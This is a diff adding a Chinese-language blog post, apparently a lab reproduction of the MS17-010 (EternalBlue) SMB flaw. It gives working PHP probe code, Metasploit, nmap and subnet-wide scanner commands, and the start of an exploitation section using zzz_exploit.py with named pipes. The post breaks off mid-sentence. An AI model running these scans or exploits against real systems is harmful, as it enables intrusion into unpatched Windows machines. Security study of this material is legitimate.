@@ -1,0 +1,923 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Nas_ms17_010 - Evi1oX</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Evi1oX" /><meta name="description" content="0x00 缘来 时隔半年,清水煮青蛙,再次复现下 ms17010&amp;hellip; 0x02 扫描探测 1.php脚本 From:冰封 用法: http://127.0.0.1/ms17-010.php?host=10.211.55.10 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27" /><meta name="keywords" content="Hugo, theme, even" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.54.0 with theme even" />
+
+
+<link rel="canonical" href="https://04z.net/post/nas-ms17-010/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+<link href="/dist/even.983f84a7.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Nas_ms17_010" />
+<meta property="og:description" content="0x00 缘来 时隔半年,清水煮青蛙,再次复现下 ms17010&hellip; 0x02 扫描探测 1.php脚本 From:冰封 用法: http://127.0.0.1/ms17-010.php?host=10.211.55.10 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://04z.net/post/nas-ms17-010/" />
+<meta property="article:published_time" content="2018-01-07T18:04:56&#43;00:00"/>
+<meta property="article:modified_time" content="2018-01-07T18:04:56&#43;00:00"/>
+
+<meta itemprop="name" content="Nas_ms17_010">
+<meta itemprop="description" content="0x00 缘来 时隔半年,清水煮青蛙,再次复现下 ms17010&hellip; 0x02 扫描探测 1.php脚本 From:冰封 用法: http://127.0.0.1/ms17-010.php?host=10.211.55.10 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27">
+
+
+<meta itemprop="datePublished" content="2018-01-07T18:04:56&#43;00:00" />
+<meta itemprop="dateModified" content="2018-01-07T18:04:56&#43;00:00" />
+<meta itemprop="wordCount" content="2544">
+
+
+
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Nas_ms17_010"/>
+<meta name="twitter:description" content="0x00 缘来 时隔半年,清水煮青蛙,再次复现下 ms17010&hellip; 0x02 扫描探测 1.php脚本 From:冰封 用法: http://127.0.0.1/ms17-010.php?host=10.211.55.10 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Evi1oX</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/post/friends">
+        <li class="mobile-menu-item">Friends</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Evi1oX</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/post/friends">Friends</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Nas_ms17_010</h1>
+
+      <div class="post-meta">
+        
+        
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+<ul>
+<li><a href="#0x00-缘来">0x00 缘来</a></li>
+<li><a href="#0x02-扫描探测">0x02 扫描探测</a>
+<ul>
+<li><a href="#1-php脚本">1.php脚本</a></li>
+<li><a href="#2-批量扫描脚本">2.批量扫描脚本</a></li>
+<li><a href="#3-smb-ms17-010">3.smb_ms17_010</a></li>
+<li><a href="#4-ms17-010-nessus-exe">4.MS17-010-Nessus.exe</a></li>
+<li><a href="#5-nmap">5.Nmap</a></li>
+</ul></li>
+<li><a href="#0x03-漏洞利用">0x03 漏洞利用</a>
+<ul>
+<li><a href="#一-worawit-ms17-010">一. worawit/MS17-010</a></li>
+<li><a href="#二-eternalblue-doublepulsar-metasploit">二.Eternalblue-Doublepulsar-Metasploit</a></li>
+<li><a href="#https-img-04z-net-img-meterpreter-session-png"><img src="https://img.04z.net/img/meterpreter-session_.png" alt="" /></a></li>
+<li><a href="#三-python3之ms17-010-py">三.python3之ms17-010.py</a></li>
+<li><a href="#四-ms17010命令行版本">四.ms17010命令行版本</a></li>
+<li><a href="#五-ms17-010-eternalblue">五.ms17_010_eternalblue</a></li>
+<li><a href="#六-ms17-010-psexec">六.ms17_010_psexec</a></li>
+</ul></li>
+</ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      
+
+<h1 id="0x00-缘来">0x00 缘来</h1>
+
+<p>时隔半年,清水煮青蛙,再次复现下 ms17010&hellip;</p>
+
+<h1 id="0x02-扫描探测">0x02 扫描探测</h1>
+
+<hr />
+
+<h2 id="1-php脚本">1.php脚本</h2>
+
+<p><strong><em>From:冰封</em></strong>  用法: <a href="http://127.0.0.1/ms17-010.php?host=10.211.55.10">http://127.0.0.1/ms17-010.php?host=10.211.55.10</a><br />
+<img src="https://img.04z.net/img/evi1ox_2018-04-26_18-12-30.jpg" alt="" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+
+<span class="c1">//根据巡风python代码翻译成PHP代码
+</span><span class="c1">//2017.08.03 by ice &amp;&amp; By T00ls.Net；
+</span><span class="c1">//https://github.com/ysrc/xunfeng/blob/master/vulscan/vuldb/MS17_010.py
+</span><span class="c1"></span><span class="o">@</span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">7</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]){</span>
+        <span class="nv">$host</span><span class="o">=</span><span class="nx">trim</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;host&#39;</span><span class="p">]);</span>
+        <span class="k">if</span><span class="p">(</span><span class="nx">ms17010</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span><span class="mi">445</span><span class="p">)){</span>
+                <span class="k">echo</span> <span class="s1">&#39;&lt;span style=&#34;color:#F00&#34;&gt;[+] Vulnerability!&lt;/span&gt;&#39;</span><span class="p">;</span>
+        <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+                <span class="k">echo</span> <span class="s1">&#39;&lt;span style=&#34;color:#000&#34;&gt;[-] No Vulnerability!&lt;/span&gt;&#39;</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">echo</span> <span class="s1">&#39;
+</span><span class="s1">[+] OS: &lt;span style=&#34;color:#666&#34;&gt;&#39;</span><span class="o">.</span><span class="nx">smbos</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span><span class="mi">445</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;&lt;/span&gt;
+</span><span class="s2">&#34;</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="nf">ms17010</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span><span class="nv">$port</span><span class="p">){</span>
+        <span class="nv">$tcp</span><span class="o">=</span><span class="s1">&#39;tcp://&#39;</span><span class="o">.</span><span class="nv">$host</span><span class="o">.</span><span class="s1">&#39;:&#39;</span><span class="o">.</span><span class="nv">$port</span><span class="p">;</span>
+        <span class="nv">$sock</span><span class="o">=</span><span class="nx">stream_socket_client</span><span class="p">(</span><span class="nv">$tcp</span><span class="p">,</span><span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span><span class="nx">STREAM_CLIENT_CONNECT</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$sock</span><span class="p">){</span>
+                <span class="nv">$data1</span><span class="o">=</span><span class="nx">pack</span><span class="p">(</span><span class="s1">&#39;H*&#39;</span><span class="p">,</span><span class="s1">&#39;00000054ff534d42720000000018012800000000000000000000000000002f4b0000c55e003100024c414e4d414e312e3000024c4d312e325830303200024e54204c414e4d414e20312e3000024e54204c4d20302e313200&#39;</span><span class="p">);</span>
+                <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span><span class="nv">$data1</span><span class="p">);</span>
+                <span class="nx">fread</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+                <span class="nv">$data2</span><span class="o">=</span><span class="nx">pack</span><span class="p">(</span><span class="s1">&#39;H*&#39;</span><span class="p">,</span><span class="s1">&#39;00000063ff534d42730000000018012000000000000000000000000000002f4b0000c55e0dff000000dfff02000100000000000000000000000000400000002600002e0057696e646f7773203230303020323139350057696e646f7773203230303020352e3000&#39;</span><span class="p">);</span>
+                <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span><span class="nv">$data2</span><span class="p">);</span>
+                <span class="nv">$data2_data</span><span class="o">=</span><span class="nx">fread</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+                <span class="nv">$user_id</span><span class="o">=</span><span class="nx">substr</span><span class="p">(</span><span class="nx">bin2hex</span><span class="p">(</span><span class="nv">$data2_data</span><span class="p">),</span><span class="mi">64</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
+                <span class="nv">$data3</span><span class="o">=</span><span class="nx">pack</span><span class="p">(</span><span class="s1">&#39;H*&#39;</span><span class="p">,</span><span class="s1">&#39;000000&#39;</span><span class="o">.</span><span class="nx">dechex</span><span class="p">(</span><span class="mi">58</span><span class="o">+</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$host</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;ff534d42750000000018012000000000000000000000000000002f4b&#39;</span><span class="o">.</span><span class="nv">$user_id</span><span class="o">.</span><span class="s1">&#39;c55e04ff000000000001001a00005c5c&#39;</span><span class="o">.</span><span class="nx">bin2hex</span><span class="p">(</span><span class="nv">$host</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;5c49504324003f3f3f3f3f00&#39;</span><span class="p">);</span>
+                <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span><span class="nv">$data3</span><span class="p">);</span>
+                <span class="nv">$data3_data</span><span class="o">=</span><span class="nx">fread</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+                <span class="nv">$allid</span><span class="o">=</span><span class="nx">substr</span><span class="p">(</span><span class="nx">bin2hex</span><span class="p">(</span><span class="nv">$data3_data</span><span class="p">),</span><span class="mi">28</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span><span class="mi">16</span><span class="p">);</span>
+                <span class="nv">$data4</span><span class="o">=</span><span class="nx">pack</span><span class="p">(</span><span class="s1">&#39;H*&#39;</span><span class="p">,</span><span class="s1">&#39;0000004aff534d422500000000180128000000000000000000000000&#39;</span><span class="o">.</span><span class="nv">$allid</span><span class="o">.</span><span class="s1">&#39;1000000000ffffffff0000000000000000000000004a0000004a0002002300000007005c504950455c00&#39;</span><span class="p">);</span>
+                <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span><span class="nv">$data4</span><span class="p">);</span>
+                <span class="nv">$data4_data</span><span class="o">=</span><span class="nx">fread</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+                <span class="k">if</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nx">bin2hex</span><span class="p">(</span><span class="nv">$data4_data</span><span class="p">),</span><span class="mi">18</span><span class="p">,</span><span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="s1">&#39;050200c0&#39;</span><span class="p">){</span>
+                        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+                <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+                        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+                <span class="p">}</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="nf">smbos</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span><span class="nv">$port</span><span class="p">){</span>
+        <span class="nv">$tcp</span><span class="o">=</span><span class="s1">&#39;tcp://&#39;</span><span class="o">.</span><span class="nv">$host</span><span class="o">.</span><span class="s1">&#39;:&#39;</span><span class="o">.</span><span class="nv">$port</span><span class="p">;</span>
+        <span class="nv">$sock</span><span class="o">=</span><span class="nx">stream_socket_client</span><span class="p">(</span><span class="nv">$tcp</span><span class="p">,</span><span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span><span class="nx">STREAM_CLIENT_CONNECT</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$sock</span><span class="p">){</span>
+                <span class="nv">$payload1</span><span class="o">=</span><span class="nx">pack</span><span class="p">(</span><span class="s1">&#39;H*&#39;</span><span class="p">,</span><span class="s1">&#39;00000085ff534d4272000000001853c80000000000000000000000000000fffe00000000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200&#39;</span><span class="p">);</span>
+                <span class="nv">$payload2</span><span class="o">=</span><span class="nx">pack</span><span class="p">(</span><span class="s1">&#39;H*&#39;</span><span class="p">,</span><span class="s1">&#39;0000010aff534d4273000000001807c80000000000000000000000000000fffe000040000cff000a01044132000000000000004a0000000000d40000a0cf00604806062b0601050502a03e303ca00e300c060a2b06010401823702020aa22a04284e544c4d5353500001000000078208a2000000000000000000000000000000000502ce0e0000000f00570069006e0064006f0077007300200053006500720076006500720020003200300030003300200033003700390030002000530065007200760069006300650020005000610063006b002000320000000000570069006e0064006f0077007300200053006500720076006500720020003200300030003300200035002e00320000000000&#39;</span><span class="p">);</span>
+                <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span><span class="nv">$payload1</span><span class="p">);</span>
+                <span class="nv">$out1</span><span class="o">=</span><span class="nx">fread</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+                <span class="nx">fwrite</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span><span class="nv">$payload2</span><span class="p">);</span>
+                <span class="nv">$out2</span><span class="o">=</span><span class="nx">fread</span><span class="p">(</span><span class="nv">$sock</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
+                <span class="nv">$blob_len_arr</span><span class="o">=</span><span class="nx">unpack</span><span class="p">(</span><span class="s1">&#39;s&#39;</span><span class="p">,</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$out2</span><span class="p">,</span><span class="mi">36</span><span class="o">+</span><span class="mi">7</span><span class="p">,</span><span class="mi">2</span><span class="p">));</span>
+                <span class="nv">$osarr</span><span class="o">=</span><span class="nx">explode</span><span class="p">(</span><span class="nx">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span><span class="nx">iconv</span><span class="p">(</span><span class="s1">&#39;UTF-16LE&#39;</span><span class="p">,</span><span class="s1">&#39;UTF-8&#39;</span><span class="p">,</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$out2</span><span class="p">,</span><span class="mi">36</span><span class="o">+</span><span class="mi">11</span><span class="o">+</span><span class="nv">$blob_len_arr</span><span class="p">[</span><span class="mi">1</span><span class="p">])));</span>
+                <span class="k">return</span> <span class="nv">$osarr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;|&#39;</span><span class="o">.</span><span class="nv">$osarr</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+        <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div>
+<hr />
+
+<h2 id="2-批量扫描脚本">2.批量扫描脚本</h2>
+
+<p><a href="https://github.com/claudioviviani/ms17-010-m4ss-sc4nn3r">https://github.com/claudioviviani/ms17-010-m4ss-sc4nn3r</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">[+] Usage: ms17-010-m4ss-sc4nn3r.py ip or ip/CIDR or ip/subnet
+
+    Example: ms17-010-m4ss-sc4nn3r.py 192.168.0.1
+             ms17-010-m4ss-sc4nn3r.py 192.168.0.0/24
+             ms17-010-m4ss-sc4nn3r.py 192.168.0.0/255.255.255.0x00</pre></td></tr></table>
+</div>
+</div>
+<p><img src="https://img.04z.net/img/evi1ox_2018-04-26_18-48-21.jpg" alt="" /></p>
+
+<hr />
+
+<h2 id="3-smb-ms17-010">3.smb_ms17_010</h2>
+
+<p>Metasploit扫描MS17-010的方案完全同Nmap，但<code>Session Setup AndX Request</code>中的Max Buffer用0xffdf。看上去只有Nessus动用了Unicode。<br />
+该洞不只是445可用，139同样可用。利用139攻击时，只需要多发1至2个报文，视目标系统而定。在管理性扫描中，务必同时检查两个端口。<br />
+探测MS17-010可以先通过smb模块扫描出开放了445端口的主机，然后再使用MS17-010模块进行漏洞探测<br />
+扫描完成后，扫描的信息会自动存入数据库，可通过hosts命令查看</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-msf" data-lang="msf"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-msf" data-lang="msf">use auxiliary/scanner/smb/smb_version
+set rhosts x.x.x.0/24
+set threads 16
+run
+use auxiliary/scanner/smb/smb_ms17_010
+show options
+set threads 16
+services -r tcp -p 445 -R
+run</code></pre></td></tr></table>
+</div>
+</div>
+<p><img src="https://img.04z.net/img/1494833317130166.png" alt="" /></p>
+
+<hr />
+
+<p>或者也可以这样</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">use auxiliary/scanner/smb/smb_ms17_010
+set ShowProgress false
+set ConnectTimeout 5
+set THREADS 16
+set RHOSTS x.x.x.x
+run</pre></td></tr></table>
+</div>
+</div>
+<p>smb_ms17_010.rb缺省只扫445/TCP。如果想扫139/TCP，必须:</p>
+
+<p><code>set SMBDirect false</code><br />
+<code>set RPORT 139</code><br />
+或者</p>
+
+<p><code>unset SMBDirect</code><br />
+<code>set RPORT 139</code></p>
+
+<hr />
+
+<h2 id="4-ms17-010-nessus-exe">4.MS17-010-Nessus.exe</h2>
+
+<p>下面这个同时支持139/TCP的单扫工具不是广告，只是和运维人员结个善缘:</p>
+
+<p>《采用Nessus扫描方案的Windows版MS17-010单扫工具》<br />
+<a href="http://scz.617.cn/windows/MS17-010-Nessus.exe">http://scz.617.cn/windows/MS17-010-Nessus.exe</a><br />
+<a href="http://scz.617.cn/windows/201706221521.txt">http://scz.617.cn/windows/201706221521.txt</a></p>
+
+<p>万一有运行时库方面的问题，自行解决吧。除了下面演示的命令行参数，其他五花八<br />
+门的命令行参数无需关心，那是历史遗迹。</p>
+
+<p>指定IP范围:</p>
+
+<p><code>$ MS17-010-Nessus.exe -q -m -b 192.168.0.1 -e 192.168.255.254 -o scan.out</code></p>
+
+<p>指定目标主机列表(每行一个目标):</p>
+
+<p><code>$ MS17-010-Nessus.exe -q -m -l hostlist -o scan.out</code></p>
+
+<p>该漏洞可以通过139/TCP利用，不限于445/TCP:</p>
+
+<p><code>$ MS17-010-Nessus.exe -q -m -b 192.168.0.1 -e 192.168.255.254 -o scan.out -p 139</code><br />
+<code>$ MS17-010-Nessus.exe -q -m -l hostlist -o scan.out -p 139</code></p>
+
+<p>如果不指定<code>-o scan.out</code>，向stdout输出</p>
+
+<p>-q 只显示vulnerable主机，否则将显示safe、unknown等其他主机</p>
+
+<p>-m 实时显示当前扫描目标，可以不指定</p>
+
+<p>scan.out的输出形如:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">xx.xx.xxx.xx    safe        [Unix|Samba 3.6.25|WORKGROUP][@WORKGROUP]
+xx.xx.x.xx      vulnerable  [Windows 7 Ultimate 7600|Windows 7 Ultimate 6.1|WORKGROUP][APPLE-PC@WORKGROUP]
+xxx.xxx.xx.xxx  vulnerable  [Windows 7 Ultimate 7601 Service Pack 1|Windows 7 Ultimate 6.1|WORKGROUP][USER-20160307TC@WORKGROUP]
+xxx.xxx.xx.xxx  vulnerable  [Windows 10 Pro 10240|Windows 10 Pro 6.3|WORKGROUP][DESKTOP-7DGEL49@WORKGROUP]
+xxx.xxx.xx.xxx  vulnerable  [Windows Server 2008 R2 Enterprise 7601 Service Pack 1|Windows Server 2008 R2 Enterprise 6.1|WORKGROUP][WIN-UV3JAC9UP5A@WORKGROUP]
+xx.xx.x.xxx     0xFFFF0002  [OS 1.00|SMB 1.0|WORKGROUP][@]</pre></td></tr></table>
+</div>
+</div>
+<hr />
+
+<h2 id="5-nmap">5.Nmap</h2>
+
+<p>不多说<br />
+<code>nmap --script smb-vuln-ms17-010 -p445 targetip</code></p>
+
+<hr />
+
+<h1 id="0x03-漏洞利用">0x03 漏洞利用</h1>
+
+<h2 id="一-worawit-ms17-010">一. worawit/MS17-010</h2>
+
+<p><a href="https://github.com/worawit/MS17-010">https://github.com/worawit/MS17-010</a><br />
+这个脚本其实在nas放出一个月就公开再Exploit-db了,很多人估计都不知道..<br />
+那么,查看zzz_exploit.py脚本会看到 <code>from mysmb import MYSMB</code> 之前有人使用python钓鱼:<code>mysmb</code>,其实真正安装了这个模块的人其实这个脚本反倒会利用失败.并且把信息发送给钓鱼者.</p>
+
+<p>回到正题.</p>
+
+<p><strong><em>依赖项</em></strong></p>
+
+<p><strong>1.pipe</strong></p>
+
+<p>经常执行脚本会发现报错.如下所示</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="err">$</span> <span class="n">python</span> <span class="n">zzz_exploit</span><span class="o">.</span><span class="n">py</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.19</span>                                                                 <span class="n">system</span>
+<span class="n">Target</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2008</span> <span class="n">R2</span> <span class="n">Datacenter</span> <span class="mi">7601</span> <span class="n">Service</span> <span class="n">Pack</span> <span class="mi">1</span>
+<span class="n">Not</span> <span class="n">found</span> <span class="n">accessible</span> <span class="n">named</span> <span class="n">pipe</span>
+<span class="n">Done</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>你可能需要的pipe</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">netlogon
+lsarpc
+samr
+browser
+atsvc
+DAV RPC SERVICE
+epmapper
+eventlog
+InitShutdown
+keysvc
+lsass
+LSM_API_service
+ntsvcs
+plugplay
+protected_storage
+router
+SapiServerPipeS-1-5-5-0-70123
+scerpc
+srvsvc
+tapsrv
+trkwks
+W32TIME_ALT
+wkssvc
+PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
+db2remotecmd
+```netlogon
+lsarpc
+samr
+browser
+atsvc
+DAV RPC SERVICE
+epmapper
+eventlog
+InitShutdown
+keysvc
+lsass
+LSM_API_service
+ntsvcs
+plugplay
+protected_storage
+router
+SapiServerPipeS-1-5-5-0-70123
+scerpc
+srvsvc
+tapsrv
+trkwks
+W32TIME_ALT
+wkssvc
+PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
+db2remotecmd</pre></td></tr></table>
+</div>
+</div>
+<p>那么直接通过 <code>python zzz_exploit.py &lt;ip&gt; [pipe_name]</code> 即可<br />
+当然有些时候没有设置username和password,并且共享中启动了密码访问..也会导致这个问题</p>
+
+<p>或者可以通过<br />
